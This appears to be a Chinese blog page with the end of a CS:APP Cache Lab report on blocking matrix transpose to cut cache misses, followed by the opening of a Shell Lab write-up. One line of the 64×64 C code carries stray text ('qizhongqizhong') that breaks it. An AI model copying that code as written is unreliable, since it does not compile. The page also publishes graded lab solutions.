<p>首先对矩阵进行分块处理。为了完全利用每一个缓存快（32个字节）采用8 × 8分块。然后处理对角线的问题。这里我采用的方法是无论是哪一个矩阵分块，均从该矩阵分块的对角线开始处理。同时对于A矩阵（原始矩阵）按列优先（不连续读），对于B矩阵（转置矩阵）按行优先（连续写）。</p>
<p>通过优先处理对角线(a, a)的元素，保证了B矩阵的第a行被载入缓存中，接下来对于A矩阵的列优先处理保证了B矩阵的第a行缓存被充分利用。</p>
<p>对于32 × 32的矩阵，总共存在1024次读和1024次写。对于非对角线的分块（总共12个），其缓存不命中率是1/8（仅强制不命中），对于对角线的分块（总共4个），其写的缓存不命中率是1/8（强制不命中），其读的缓存不命中率为1/4（强制不命中和冲突不命中各一半）。</p>
<p>因此，理论上优化之后的总缓存不命中数为2048 × 0.75 × 0.125 + 1024 × 0.25 × 0.125 + 1024 × 0.25 × 0.25 = 288次。</p>
<p>第一部分优化之后的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">8</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = b ; c &lt; b + <span class="number">8</span> ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = a + c - b ; d &gt;= a ; --d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (d = a + c - b + <span class="number">1</span> ; d &lt; a + <span class="number">8</span> ; ++d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数为287次，与理论值几乎一致。</p>
<h4 id="第二部分-64-×-64矩阵优化"><a href="#第二部分-64-×-64矩阵优化" class="headerlink" title="第二部分 64 × 64矩阵优化"></a>第二部分 64 × 64矩阵优化</h4><p>第二部分的满分要求是misses小于1300，当misses大于2000则零分。</p>
<p>第二部分对于misses的要求限制的非常严格，同时如果采用第一部分的8 × 8分块方式会出人意料地带来大量的misses。下面具体分析8 × 8分块导致misses增多的原因。</p>
<p>实验采用的缓存为直接映射高速缓存，s = 5， b = 5， E = 1。对于任意一个地址，其从低地址开始的第0-4位为块偏移b，第5-9为组索引s。</p>
<p>对于32 × 32的矩阵M来说，M[0][1]和M[1][1]之间总共间隔32个int型元素，也就是0x80个字节，也就是说，同一列相邻行的元素之间的地址间隔为0x80 = 0x100|00000。对于8 × 8的矩阵分块而言，其8行可以全部被加载进入缓存中而不发生任何冲突不命中。</p>
<p>然而，对于64 × 64的矩阵，其同一列相邻行的元素之间的地址间隔为0x100 = 0x1000|00000。对于8 × 8的矩阵分块而言，其第1、2、3、4行的元素会和第5、6、7、8行的元素占用相同的高速缓存组，进而出现严重的冲突不命中现象。</p>
<p>使用4 × 4的矩阵分块又无法充分利用每一个高速缓存行（32个字节=8个int数据），仍然无法达到所要求的misses数。</p>
<p>经过大量的尝试，我使用了以下的方法进行矩阵转置的优化：</p>
<p>仍然按照8 × 8对矩阵进行分块，只是在8 × 8的分块内部再按照4 × 4进一步分块，得到左上、右上、左下、右下4个子块。</p>
<p>紧接着依次按照左上、右上、右下、左下的方式处理4个子块（A矩阵）。<br>对于左上、右下这两个可能出现对角线元素的块，按照第一个矩阵优化的方式进行处理。<br>右上、左下子块不能简单地按照A矩阵不连续读，B矩阵连续写的方式处理。原因是对于对角线上的8 × 8分块来说，A、B矩阵的左上子块和右下子块占用了相同的高速缓存组，存在着严重的冲突不命中风险。<br>因此对于右上、左下的子块，我们按照下图的方式处理。</p>
<img src="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/matrix64-1" alt="matrix64-1" title="">
<p>图中，上方的矩阵为矩阵A，下方的矩阵为矩阵B，小方块代表矩阵的元素，黑色方块的表明加载进入临时变量/已写入的元素。红色的线表明该行被缓存。</p>
<ol>
<li>利用8个临时变量，将左上子块的前两行加载进入临时变量中，考虑到之前的缓存条件，该次加载的缓存命中。</li>
<li>将一个小的2×2的矩阵转置写入矩阵B右下子块的前两行，无论是否为对角线上的分块，该次写入一定会发生缓存不命中，同时将B矩阵的前两行载入高速缓存行。</li>
<li>将矩阵A左上子块的后两行的2×2的矩阵加载进入空闲的4个临时变量中，同之前加载相似，该次加载的缓存命中。</li>
<li>将刚刚加载的2×2矩阵转置写入B矩阵右下子块前两行的剩余位置，由于之前这两行已经加载进入了高速缓存行，故该次写入的缓存全部命中。</li>
<li>将矩阵A后两行的剩余元素加载进入空闲的4个临时变量中，缓存命中。</li>
<li>将8个临时变量中的元素依次转置写入矩阵B右下子块的最后两行中，同2相似，写入一定会发生缓存不命中，同时将矩阵B的后两行载入高速缓存行。</li>
</ol>
<p>A矩阵左下子块的转置操作类似，这里不再赘述。</p>
<p>在A矩阵右上子块转置完成后，紧接着执行的是右下子块的转置，此时，对于非对角线上的分块而言，写入时的缓存必定命中。对于对角线上的分块，则会发生缓存不命中。</p>
<p>因此，对于64 × 64的矩阵，总共进行4096次读和4096次写，对于非对角线的分块（总共56个），对于A矩阵（原始矩阵而言），其左上、右下分块的不命中率为1/4，左下、右上分块的不命中率为0；对于B矩阵（转置矩阵而言），其左上、右上、左下分块的不命中率均为1/4，右下分块的不命中率为0。对于对角线上的矩阵，其B矩阵不命中率上升至1/4，对于A矩阵，其左上、右下的不命中率上升至1/2。</p>
<p>因此，理论上优化之后的总缓存不命中数为4096 × (8/64) × (1/2 × 1/4 + 0 × 1/4 + 0 × 1/4 + 1/2 × 1/4) + 4096 × (8/64) × 1/4 + 4096 × (56/64) × (1/4 × 1/4 + 0 × 1/4 + 0 × 1/4 + 1/4 × 1/4) + 4096 × (56/64) × (1/4 × 1/4 + 1/4 × 1/4 + 0 × 1/4 + 1/4 × 1/4) = 1376次。</p>
<p>该优化方法对应的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; M ; a += <span class="number">8</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; N ; b += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = a ; c &lt; a + <span class="number">4</span> ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a ; d &gt;= b ; -- d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a + <span class="number">1</span>; d &lt; b + <span class="number">4</span> ; ++d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        tmp0 = A[b][a + <span class="number">4</span>];</div><div class="line">        tmp1 = A[b][a + <span class="number">5</span>];</div><div class="line">        tmp2 = A[b][a + <span class="number">6</span>];</div><div class="line">        tmp3 = A[b][a + <span class="number">7</span>];</div><div class="line">        tmp4 = A[b + <span class="number">1</span>][a + <span class="number">4</span>];</div><div class="line">        tmp5 = A[b + <span class="number">1</span>][a + <span class="number">5</span>];</div><div class="line">        tmp6 = A[b + <span class="number">1</span>][a + <span class="number">6</span>];</div><div class="line">        tmp7 = A[b + <span class="number">1</span>][a + <span class="number">7</span>];</div><div class="line">        B[a + <span class="number">4</span>][b] = tmp0;</div><div class="line">        B[a + <span class="number">4</span>][b + <span class="number">1</span>] = tmp4;</div><div class="line">        B[a + <span class="number">5</span>][b] = tmp1;</div><div class="line">        B[a + <span class="number">5</span>][b + <span class="number">1</span>] = tmp5;</div><div class="line">        tmp0 = A[b + <span class="number">2</span>][a + <span class="number">4</span>];</div><div class="line">        tmp4 = A[b + <span class="number">2</span>][a + <span class="number">5</span>];</div><div class="line">        tmp1 = A[b + <span class="number">3</span>][a + <span class="number">4</span>];</div><div class="line">        tmp5 = A[b + <span class="number">3</span>][a + <span class="number">5</span>];</div><div class="line">        B[a + <span class="number">4</span>][b + <span class="number">2</span>] = tmp0;</div><div class="line">        B[a + <span class="number">4</span>][b + <span class="number">3</span>] = tmp1;</div><div class="line">        B[a + <span class="number">5</span>][b + <span class="number">2</span>] = tmp4;</div><div class="line">        B[a + <span class="number">5</span>][b + <span class="number">3</span>] = tmp5;</div><div class="line">        tmp0 = A[b + <span class="number">2</span>][a + <span class="number">6</span>];</div><div class="line">        tmp4 = A[b + <span class="number">2</span>][a + <span class="number">7</span>];</div><div class="line">        tmp1 = A[b + <span class="number">3</span>][a + <span class="number">6</span>];</div><div class="line">        tmp5 = A[b + <span class="number">3</span>][a + <span class="number">7</span>];</div><div class="line">        B[a + <span class="number">6</span>][b] = tmp2;</div><div class="line">        B[a + <span class="number">6</span>][b + <span class="number">1</span>] = tmp6;</div><div class="line">        B[a + <span class="number">6</span>][b + <span class="number">2</span>] = tmp0;</div><div class="line">        B[a + <span class="number">6</span>][b + <span class="number">3</span>] = tmp1;</div><div class="line">        B[a + <span class="number">7</span>][b] = tmp3;</div><div class="line">        B[a + <span class="number">7</span>][b + <span class="number">1</span>] = tmp7;</div><div class="line">        B[a + <span class="number">7</span>][b + <span class="number">2</span>] = tmp4;</div><div class="line">        B[a + <span class="number">7</span>][b + <span class="number">3</span>] = tmp5;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (c = a + <span class="number">4</span>; c &lt; a + <span class="number">8</span> ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a ; d &gt;= b + <span class="number">4</span> ; --d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (d = b + c - a + <span class="number">1</span> ; d &lt; b + <span class="number">8</span> ; ++d) &#123;</div><div class="line">                B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        tmp0 = A[b + <span class="number">6</span>][a];</div><div class="line">        tmp1 = A[b + <span class="number">6</span>][a + <span class="number">1</span>];</div><div class="line">        tmp2 = A[b + <span class="number">6</span>][a + <span class="number">2</span>];</div><div class="line">        tmp3 = A[b + <span class="number">6</span>][a + <span class="number">3</span>];</div><div class="line">        tmp4 = A[b + <span class="number">7</span>][a];</div><div class="line">        tmp5 = A[b + <span class="number">7</span>][a + <span class="number">1</span>];</div><div class="line">        tmp6 = A[b + <span class="number">7</span>][a + <span class="number">2</span>];</div><div class="line">        tmp7 = A[b + <span class="number">7</span>][a + <span class="number">3</span>];</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">6</span>] = tmp2;</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">7</span>] = tmp6;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">6</span>] = tmp3;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">7</span>] = tmp7;</div><div class="line">        tmp2 = A[b + <span class="number">4</span>][a + <span class="number">2</span>];</div><div class="line">        tmp3 = A[b + <span class="number">4</span>][a + <span class="number">3</span>];</div><div class="line">        tmp6 = A[b + <span class="number">5</span>][a + <span class="number">2</span>];</div><div class="line">        tmp7 = A[b + <span class="number">5</span>][a + <span class="number">3</span>];</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">4</span>] = tmp2;</div><div class="line">        B[a + <span class="number">2</span>][b + <span class="number">5</span>] = tmp6;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">4</span>] = tmp3;</div><div class="line">        B[a + <span class="number">3</span>][b + <span class="number">5</span>] = tmp7;</div><div class="line">        tmp2 = A[b + <span class="number">4</span>][a];</div><div class="line">        tmp3 = A[b + <span class="number">4</span>][a + <span class="number">1</span>];</div><div class="line">        tmp6 = A[b + <span class="number">5</span>][a];</div><div class="line">        tmp7 = A[b + <span class="number">5</span>][a + <span class="number">1</span>];</div><div class="line">        B[a][b + <span class="number">4</span>] = tmp2;</div><div class="line">        B[a][b + <span class="number">5</span>] = tmp6;</div><div class="line">        B[a][b + <span class="number">6</span>] = tmp0;qizhongqizhong</div><div class="line">        B[a][b + <span class="number">7</span>] = tmp4;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">4</span>] = tmp3;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">5</span>] = tmp7;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">6</span>] = tmp1;</div><div class="line">        B[a + <span class="number">1</span>][b + <span class="number">7</span>] = tmp5;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1379次。</p>
<p>到了这里我已经优化到了极限，但是依然没有达到满分，最后参考了网上的满分答案。<br>这里要注意到，实验讲义中说的很清楚，不允许修改矩阵A，但是矩阵B可以任意修改。因此，我们可以通过在矩阵B中暂存转置的结果来充分利用缓存，进一步降低缓存不命中数。思路如下图。</p>
<img src="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/matrix64-2" alt="matrix64-2" title="">
<ol>
<li>按行加载矩阵A，并且将其存入矩阵B。依次执行4次，直到整个分块的上半部分处理完毕。其中，每行的前4个元素被正确转置，后四个元素被暂存至矩阵B的右上分块。</li>
<li>对于分块的下半部分的第一行，先将矩阵B的右上分块的4个元素载入至临时变量，然后从矩阵A中的左下分块读取第一列并转置进入矩阵右上分块的第一行，然后将读出的4个元素存入矩阵B右下分块的第一行，最后再将矩阵A右下分块第一列转置送入矩阵B右下分块的第一行。</li>
<li>按照2的方式依次处理完下半部分的所有行。</li>
</ol>
<p>对于一个8×8的分块而言，过程1处理了分块的上半部分，共执行了32次读和32次写。对于对角线上的分块，其读不命中率为1/8，写不命中率为1/4；对于非对角线上的分块，其读不命中率为1/8，写不命中率为1/8。过程2和3处理了分块的下半部分包括将矩阵B的右上子块移动到正确位置，将矩阵A的左下子块转置到B的右上子块以及矩阵A右下子块的转置，共执行了48次读和48次写。对于对角线上的分块，其读不命中率为1/3，写不命中率为1/4；对于非对角线上的分块，其读不命中率为1/12，写不命中率为1/12。</p>
<p>因此对于56个非对角线分块以及8个对角线分块，理论上优化后的总缓存不命中数为(32 × 1/8 + 32 × 1/8) × 56 + (32 × 1/8 + 32 × 1/4) × 8 + (48 × 1/12 + 48 × 1/12) × 56 + (48 × 1/3 + 48 × 1/4) × 8 = 1216次。</p>
<p>该优化方法的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">8</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">8</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = b ; c &lt; b + <span class="number">4</span> ; ++c) &#123;</div><div class="line">            tmp0 = A[c][a];</div><div class="line">            tmp1 = A[c][a + <span class="number">1</span>];</div><div class="line">            tmp2 = A[c][a + <span class="number">2</span>];</div><div class="line">            tmp3 = A[c][a + <span class="number">3</span>];</div><div class="line">            tmp4 = A[c][a + <span class="number">4</span>];</div><div class="line">            tmp5 = A[c][a + <span class="number">5</span>];</div><div class="line">            tmp6 = A[c][a + <span class="number">6</span>];</div><div class="line">            tmp7 = A[c][a + <span class="number">7</span>];</div><div class="line">            B[a][c] = tmp0;</div><div class="line">            B[a + <span class="number">1</span>][c] = tmp1;</div><div class="line">            B[a + <span class="number">2</span>][c] = tmp2;</div><div class="line">            B[a + <span class="number">3</span>][c] = tmp3;</div><div class="line">            B[a][c + <span class="number">4</span>] = tmp4;</div><div class="line">            B[a + <span class="number">1</span>][c + <span class="number">4</span>] = tmp5;</div><div class="line">            B[a + <span class="number">2</span>][c + <span class="number">4</span>] = tmp6;</div><div class="line">            B[a + <span class="number">3</span>][c + <span class="number">4</span>] = tmp7;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (c = a + <span class="number">4</span> ; c &lt; a + <span class="number">8</span> ; ++c) &#123;</div><div class="line">            tmp0 = B[c - <span class="number">4</span>][b + <span class="number">4</span>];</div><div class="line">            tmp1 = B[c - <span class="number">4</span>][b + <span class="number">5</span>];</div><div class="line">            tmp2 = B[c - <span class="number">4</span>][b + <span class="number">6</span>];</div><div class="line">            tmp3 = B[c - <span class="number">4</span>][b + <span class="number">7</span>];</div><div class="line"></div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">4</span>] = A[b + <span class="number">4</span>][c - <span class="number">4</span>];</div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">5</span>] = A[b + <span class="number">5</span>][c - <span class="number">4</span>];</div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">6</span>] = A[b + <span class="number">6</span>][c - <span class="number">4</span>];</div><div class="line">            B[c - <span class="number">4</span>][b + <span class="number">7</span>] = A[b + <span class="number">7</span>][c - <span class="number">4</span>];</div><div class="line"></div><div class="line">            B[c][b] = tmp0;</div><div class="line">            B[c][b + <span class="number">1</span>] = tmp1;</div><div class="line">            B[c][b + <span class="number">2</span>] = tmp2;</div><div class="line">            B[c][b + <span class="number">3</span>] = tmp3;</div><div class="line"></div><div class="line">            B[c][b + <span class="number">4</span>] = A[b + <span class="number">4</span>][c];</div><div class="line">            B[c][b + <span class="number">5</span>] = A[b + <span class="number">5</span>][c];</div><div class="line">            B[c][b + <span class="number">6</span>] = A[b + <span class="number">6</span>][c];</div><div class="line">            B[c][b + <span class="number">7</span>] = A[b + <span class="number">7</span>][c];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1219次。</p>
<h4 id="第三部分-61-×-67矩阵优化"><a href="#第三部分-61-×-67矩阵优化" class="headerlink" title="第三部分 61 × 67矩阵优化"></a>第三部分 61 × 67矩阵优化</h4><p>由于61 × 67的矩阵不是方阵，不方便定量分析。同时限制放的比较宽松，满分misses小于2000，misses大于3000零分。因此无需考虑处理对角线，仅尝试换用不同的边长分块即可。16 × 16的分块已可以保证满分。</p>
<p>第三部分优化之后的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (a = <span class="number">0</span> ; a &lt; N ; a += <span class="number">16</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (b = <span class="number">0</span> ; b &lt; M ; b += <span class="number">16</span>) &#123;</div><div class="line">        <span class="keyword">for</span> (c = b ; (c &lt; b + <span class="number">16</span>) &amp;&amp; (c &lt; M) ; ++c) &#123;</div><div class="line">            <span class="keyword">for</span> (d = a ; (d &lt; a + <span class="number">16</span>) &amp;&amp; (d &lt; N) ; ++d) &#123;</div><div class="line">                    B[c][d] = A[d][c];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际测试的缓存不命中数是1847次。</p>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>自动评分脚本给出的输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Cache Lab summary:</div><div class="line">                        Points   Max pts      Misses</div><div class="line">Csim correctness          27.0        27</div><div class="line">Trans perf 32x32           8.0         8         287</div><div class="line">Trans perf 64x64           8.0         8        1219</div><div class="line">Trans perf 61x67          10.0        10        1847</div><div class="line">          Total points    53.0        53</div></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>这次实验花费了我很久时间，最后还是参考了网上的解法并且花了很大精力去理解，实验给出的缓存条件非常苛刻，但同时也方便了定量分析。完成后确实大大加深了我对于缓存的理解。</p>
<p>这次实验中我认为比较重要/难的地方：一是对于缓存的理解以及矩阵元素在缓存中的排布问题；二是位于对角线上的分块不仅是内部而且在分块间存在的冲突不命中问题；三是虽然是矩阵，但是也要明确统一控制行列的变量。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/08/01/深入理解计算机系统ShellLab实验报告/">
                            深入理解计算机系统ShellLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-08-01T15:27:04+08:00">
	
		    8月 01, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/ShellLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>这一个月一来一直在看《深入理解计算机系统》的后几章，终于全部看完了（除了第4章：处理器体系结构外）。然后开始集中处理实验，以下是Shell Lab的实验解答。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Shell Lab - Writing Your Own Unix Shell主要是有关于进程、信号以及异常处理的实验，对应于书本的第8章：异常控制流。主要通过实现一个带作业控制的Unix Shell来熟悉进程以及信号的概念。</p>
<p>本实验已经给出了Tiny Shell的源程序的基本框架(tsh.c)，你需要做的是填充该框架中的eval builtin_cmd do_bgfg waitfg sigchld_handler sigint_handler sigtstp_handler等函数。使得编译后的Shell具有相应的功能。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/shlab.pdf" target="_blank" rel="external">实验讲义</a></p>
<h2 id="Shell介绍"><a href="#Shell介绍" class="headerlink" title="Shell介绍"></a>Shell介绍</h2><p>Shell是一个代表用户运行程序的命令行解释器。一个Shell周期性的打印一个提示符，从标准输入流等待一条命令行输入，然后根据命令行的输入执行相应的功能。</p>
<p>一条命令行输入是由空格分隔ASCII文本词(words)。命令行输入的第一个词要不然是一个内建命令(built-in command)要不然是一个可执行文件的路径。剩余的词是命令行参数。如果第一个词是内建命令，Shell立刻在当前进程中执行该命令。否则，词会被假设为一个可执行程序的路径。在这种情况下，Shell会fork出一个子进程，在子进程的上下文中加载并运行这个程序。被创建的子进程被称作任务(job)。总的来说，一个任务可以包含通过Unix管道(Unix Pipe)连接的多个子进程。</p>
<p>如果命令行输入以<code>&#39;&amp;&#39;</code>结尾，那么这个任务将会在后台执行，这意味着Shell在打印下一个提示符并等待下一条命令行输入之前不会等待当前任务终止。在默认情况下，任务运行在前台，这意味这Shell在下一条命令行输入之前会等待当前任务终止。在任何的情况下， 只能有一个任务运行在前台，但是，可以有多个任务运行在后台。</p>
<p>例如，输入<code>tsh&gt; jobs</code>使得Shell执行内建的jobs命令，输入<code>tsh&gt; /bin/ls -l -d</code>则在前台运行ls程序，同时，这个程序的argc == 3，argv[0] == “/bin/ls”a，argv[1] == “-l”，argv[2] == “-d”。相应地，输入<code>tsh&gt; /bin/ls -l -d &amp;</code>则会在后台运行ls程序。</p>
<p>Unix Shell支持作业控制的概念，这允许用户将任务在前台和后台间来回移动，并且改变一个任务中进程的状态（运行，停止，终止）。按下ctrl-c将会发送SIGINT信号到当前前台任务的每一个进程中。按下ctrl-z将会发送SIGTSTP信号到前台任务的每一个进程中，SIGTSTP信号的默认功能是将进程设置为停止状态，直到其被一个SIGCONT信号唤醒。Unix Shell提供了不同的内建命令来支持作业控制，如：</p>
<ul>
<li>jobs - 打印运行的和停止的后台任务</li>
<li>bg <job> - 将一个停止的后台任务转变为一个运行的后台任务</job></li>
<li>fb <job> - 将一个运行的或是停止的后台任务转变为一个运行的前台任务</job></li>
<li>kill <job> - 终止一个任务</job></li>
</ul>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>所实现的tsh shell应当具有如下的特性：</p>
<ul>
<li>提示符应当为<code>&quot;tsh&gt; &quot;</code></li>
<li>用户的命令行输入应当包括一个名字和0个或多个参数，均由一个或多个空格隔开。如果名字是一个内建命令，那么tsh应当立刻处理它并且等待下一个命令行输入。否则，tsh就会假设它是一个可执行文件的路径，并且在一个独立的子进程中加载并执行它</li>
<li>tsh不需要支持管道(|)和I/O重定向(&gt;和&lt;)</li>
<li>按下ctrl-c(ctrl-z)将会导致一个SIGINT(SIGTSTP)信号被发送至当前的前台任务，如果现在没有前台任务，那么这些信号将没有效果</li>
<li>如果命令行输入以一个<code>&#39;&amp;&#39;</code>结束，那么tsh将会在后台运行这个任务，否则它会在前台运行这个任务</li>
<li>每一个任务都可以被一个进程ID(PID)或是一个被tsh分配的正整数的任务ID(JID)唯一的标识。JIDS可以被前缀<code>&#39;%&#39;</code>标识，例如，<code>&#39;%5&#39;</code>就代表了JID 5，而<code>&#39;5&#39;</code>就代表了PID 5</li>
<li>tsh应当提供如下的内建命令：<ul>
<li>quit命令直接终止shell</li>
<li>jobs命令列出所有在后台运行的任务</li>
<li>bg <job>命令通过给<job>发送SIGCONT信号将其重启，然后将其在后台运行。参数<job>既可以是一个PID，也可以是一个JID</job></job></job></li>
<li>fg <job>命令通过给<job>发送SIGCONT信号将其重启，然后将其在前台运行。参数<job>既可以是一个PID，也可以使一个JID</job></job></job></li>
</ul>
</li>
<li>tsh应当回收它的所有僵死子进程。如果任何任务因为收到了一个未被捕获的信号而终止，那么tsh应当识别对应的事件并且输出相应的信息</li>
</ul>
<h2 id="实验评测"><a href="#实验评测" class="headerlink" title="实验评测"></a>实验评测</h2><ol>
<li>参考答案 - 实验提供了一个作为参考的tshref可执行文件作为tsh的参考。你的tsh应当提供和tshref一致的输出（除了PIDs以外）</li>
<li>Shell驱动 - sdriver.pl程序将shell作为一个子进程来执行，根据trace file来向它发送命令和信号，并且将shell的输出捕获并输出。实验总共提供了16个trace file。关于sdriver的具体用法请参考实验讲义。</li>
</ol>
